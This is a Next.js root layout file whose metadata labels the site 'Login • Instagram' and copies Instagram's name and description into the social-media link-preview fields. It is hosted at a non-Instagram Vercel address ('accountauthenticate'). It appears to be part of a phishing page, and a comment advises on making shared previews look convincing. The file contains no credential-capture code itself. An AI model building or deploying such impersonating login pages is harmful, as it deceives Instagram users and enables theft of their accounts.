import type { Metadata } from 'next';
import { Inter } from 'next/font/google';
import '@/styles/globals.css';

const inter = Inter({ subsets: ['latin'] });

export const metadata: Metadata = {
  title: 'Login • Instagram',
  description: 'Log in to Instagram to connect with friends and share your moments',
  icons: {
    icon: '/favicon.ico?v=2',
  },
  openGraph: {
    title: 'Login • Instagram',
    description: 'Log in to Instagram to connect with friends and share your moments',
    url: 'https://accountauthenticate.vercel.app',
    siteName: 'Instagram',
    images: [
      {
        // Use a SQUARE logo (1:1 aspect ratio) for better previews
        url: 'https://accountauthenticate.vercel.app/preview.png', // Replace with your hosted square image
        width: 1200,
        height: 630,
        alt: 'Instagram Login Preview',
      },
    ],
    locale: 'en_US',
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Login • Instagram',
    description: 'Log in to Instagram to connect with friends and share your moments',
    images: ['https://accountauthenticate.vercel.app/preview.png'], // Same square image
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="en">
      <body className={inter.className}>{children}</body>
    </html>
  );
}